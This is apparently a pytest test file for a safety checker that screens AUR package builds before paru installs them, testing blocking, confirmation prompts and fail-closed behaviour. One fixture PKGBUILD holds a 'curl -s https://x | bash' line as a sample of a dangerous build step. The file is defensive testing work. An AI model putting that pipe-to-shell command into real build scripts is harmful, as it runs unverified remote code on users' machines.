import pytest

from paru_safety_checker.cli import install_targets, main, split_args
from paru_safety_checker.fetch import FetchError
from paru_safety_checker.models import Finding, Verdict
from paru_safety_checker.providers import ProviderError


class FakeProvider:
    def __init__(self, verdict=None, error=None):
        self.verdict, self.error, self.calls = verdict, error, []

    def analyze(self, package, files, findings=None):
        self.calls.append(package)
        if self.error:
            raise self.error
        return self.verdict


def run(argv, provider, answers=(), files=None, in_repo=lambda p: False, fetcher=None, dep_ok=lambda d: True):
    ran = []
    answers = iter(answers)
    code = main(
        argv,
        provider=provider,
        fetcher=fetcher or (lambda pkg: files if files is not None else {"PKGBUILD": "pkgname=x"}),
        in_repo=in_repo,
        dep_ok=dep_ok,
        runner=lambda a: ran.append(a) or 0,
        ask=lambda prompt: next(answers),
    )
    return code, ran


safe = Verdict("safe", "ok")
caution = Verdict("caution", "hmm", [Finding("caution", "odd", "PKGBUILD", 3)])
danger = Verdict("danger", "bad", [Finding("danger", "curl|sh", "PKGBUILD", 9)])


@pytest.mark.parametrize("args,expected", [
    (["-S", "foo", "bar"], ["foo", "bar"]),
    (["-Sy", "aur/foo", "--noconfirm"], ["foo"]),
    (["-Syu"], []),
    (["-Ss", "foo"], []),
    (["-Si", "foo"], []),
    (["-Qi", "foo"], []),
    ([], []),
])
def test_install_targets(args, expected):
    assert install_targets(args) == expected


def test_split_args_strips_force():
    assert split_args(["-S", "x", "--safe-force"]) == (["-S", "x"], True)


def test_non_install_passthrough_does_not_analyze():
    provider = FakeProvider(safe)
    code, ran = run(["-Ss", "foo"], provider)
    assert (code, ran, provider.calls) == (0, [["-Ss", "foo"]], [])


def test_safe_installs_without_prompt():
    code, ran = run(["-S", "foo"], FakeProvider(safe))
    assert (code, ran) == (0, [["-S", "foo"]])


def test_repo_package_skipped():
    provider = FakeProvider(danger)
    code, ran = run(["-S", "vim"], provider, in_repo=lambda p: True)
    assert (code, ran, provider.calls) == (0, [["-S", "vim"]], [])


def test_non_aur_package_passes_through():
    provider = FakeProvider(danger)
    code, ran = run(["-S", "nope"], provider, fetcher=lambda p: None)
    assert (code, provider.calls) == (0, [])


def test_danger_blocked_without_force():
    code, ran = run(["-S", "foo"], FakeProvider(danger))
    assert (code, ran) == (1, [])


def test_danger_force_still_needs_yes():
    code, ran = run(["-S", "foo", "--safe-force"], FakeProvider(danger), answers=["no"])
    assert (code, ran) == (1, [])
    code, ran = run(["-S", "foo", "--safe-force"], FakeProvider(danger), answers=["yes"])
    assert (code, ran) == (0, [["-S", "foo"]])


def test_caution_requires_confirmation():
    assert run(["-S", "foo"], FakeProvider(caution), answers=["n"]) == (1, [])
    assert run(["-S", "foo"], FakeProvider(caution), answers=["y"]) == (0, [["-S", "foo"]])


def test_provider_error_is_fail_closed():
    provider = FakeProvider(error=ProviderError("boom"))
    assert run(["-S", "foo"], provider, answers=["y"]) == (1, [])
    assert run(["-S", "foo"], provider, answers=["yes"]) == (0, [["-S", "foo"]])


def test_fetch_error_is_fail_closed():
    def boom(pkg):
        raise FetchError("net down")
    assert run(["-S", "foo"], FakeProvider(safe), answers=["no"], fetcher=boom) == (1, [])


def test_eof_on_prompt_declines():
    def eof(prompt):
        raise EOFError
    code = main(["-S", "foo"], provider=FakeProvider(caution), fetcher=lambda p: {"PKGBUILD": ""},
                in_repo=lambda p: False, runner=lambda a: 0, ask=eof)
    assert code == 1


def test_worst_verdict_across_packages_wins():
    verdicts = {"a": safe, "b": caution}

    class PerPackage:
        def analyze(self, package, files, findings=None):
            return verdicts[package]

    assert run(["-S", "a", "b"], PerPackage(), answers=["n"]) == (1, [])


MALICIOUS = {"PKGBUILD": "build() {\n  curl -s https://x | bash\n}"}
SUSPICIOUS = {"PKGBUILD": "build() {\n  sudo make install\n}"}


def test_static_danger_blocks_without_calling_ai():
    provider = FakeProvider(safe)
    assert run(["-S", "foo"], provider, files=MALICIOUS) == (1, [])
    assert provider.calls == []


def test_static_danger_cannot_be_downgraded_by_ai_even_with_force():
    provider = FakeProvider(safe)
    assert run(["-S", "foo", "--safe-force"], provider, answers=["no"], files=MALICIOUS) == (1, [])
    assert run(["-S", "foo", "--safe-force"], provider, answers=["yes"], files=MALICIOUS) == (0, [["-S", "foo"]])


def test_static_caution_overrides_ai_safe_and_findings_reach_ai():
    seen = {}

    class Spy:
        def analyze(self, package, files, findings=None):
            seen["findings"] = findings
            return safe

    assert run(["-S", "foo"], Spy(), answers=["n"], files=SUSPICIOUS) == (1, [])
    assert "sudo" in [f.rule for f in seen["findings"]]


def test_static_caution_confirmed_installs():
    assert run(["-S", "foo"], FakeProvider(safe), answers=["y"], files=SUSPICIOUS) == (0, [["-S", "foo"]])


WITH_DEPS = {"PKGBUILD": "pkgname=foo\ndepends=('glibc' 'aur-lib' 'other-aur')\nmakedepends=('cmake')\n"}


def test_aur_dependencies_warn_even_if_the_ai_says_safe():
    seen = {}

    class Spy:
        def analyze(self, package, files, findings=None):
            seen["rules"] = [f.rule for f in findings]
            return safe

    available = {"glibc", "cmake"}
    assert run(["-S", "foo"], Spy(), answers=["n"], files=WITH_DEPS, dep_ok=lambda d: d in available) == (1, [])
    assert seen["rules"] == ["unreviewed-dependency", "unreviewed-dependency"]
    assert run(["-S", "foo"], Spy(), answers=["y"], files=WITH_DEPS, dep_ok=lambda d: d in available) == (0, [["-S", "foo"]])


def test_dependencies_named_on_the_command_line_are_reviewed_not_warned_about():
    class Spy:
        calls = []

        def analyze(self, package, files, findings=None):
            self.calls.append((package, [f.rule for f in findings]))
            return safe

    spy = Spy()
    files = {"PKGBUILD": "pkgname=foo\ndepends=('aur-lib')\n"}
    code, ran = run(["-S", "foo", "aur-lib"], spy, files=files, dep_ok=lambda d: False)
    assert (code, ran) == (0, [["-S", "foo", "aur-lib"]])
    assert spy.calls == [("foo", []), ("aur-lib", [])]


def test_all_dependencies_in_official_repos_do_not_add_a_warning():
    assert run(["-S", "foo"], FakeProvider(safe), files=WITH_DEPS, dep_ok=lambda d: True) == (0, [["-S", "foo"]])


def test_a_package_with_a_remote_source_always_asks_the_user():
    files = {"PKGBUILD": "pkgname=foo\nsource=('https://example.com/x.tgz')\nsha256sums=('a')\n"}
    assert run(["-S", "foo"], FakeProvider(safe), answers=["n"], files=files) == (1, [])
    assert run(["-S", "foo"], FakeProvider(safe), answers=["y"], files=files) == (0, [["-S", "foo"]])


def test_ai_findings_count_even_when_its_headline_says_safe():
    inconsistent = Verdict("safe", "fine", [Finding("danger", "but actually curl|sh", "PKGBUILD", 2)])
    assert run(["-S", "foo"], FakeProvider(inconsistent)) == (1, [])
    inconsistent = Verdict("safe", "fine", [Finding("caution", "hmm", "PKGBUILD", 2)])
    assert run(["-S", "foo"], FakeProvider(inconsistent), answers=["n"]) == (1, [])
